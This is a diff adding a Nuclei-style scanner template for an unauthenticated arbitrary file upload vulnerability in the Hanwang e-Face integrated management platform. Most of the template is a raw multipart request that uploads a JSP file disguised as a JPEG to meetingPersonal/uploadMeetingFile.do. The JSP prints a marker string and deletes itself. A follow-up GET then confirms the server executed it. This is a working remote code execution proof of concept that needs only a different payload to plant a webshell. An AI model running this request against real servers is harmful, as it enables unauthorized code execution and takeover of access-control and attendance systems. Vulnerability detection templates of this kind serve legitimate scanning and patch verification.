@@ -1,0 +1,56 @@
+id: hanwang-uploadMeetingFile-fileupload
+info:
+  name: 汉王e脸通综合管理平台 meetingPersonal/uploadMeetingFile.do 任意文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 meetingPersonal/uploadMeetingFile.do 接口存在任意文件上传漏洞。攻击者可在无需认证的情况下，通过向该接口上传恶意文件，实现任意文件上传，进而可能导致远程代码执行或服务器被控制，严重威胁系统安全。
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483877&idx=1&sn=e0f8b338f8c6d0936ed3d072ad990717&chksm=9606e777a1716e611e31853a39a439fb6194606ad29fd7c9f840bfbfa6d17e7e5753784488fd&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileupload,hanwang
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /manage/meetingPersonal/uploadMeetingFile.do?recoToken=67mds2pxXQb&type= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Length: 495
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: image/jpeg
+
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+      
+      - |+
+        GET /manage/resource/{{shellpath}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors: 
+      - type: json
+        part: body_1
+        internal: true
+        name: shellpath
+        json:
+          - ".obj.path" 
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
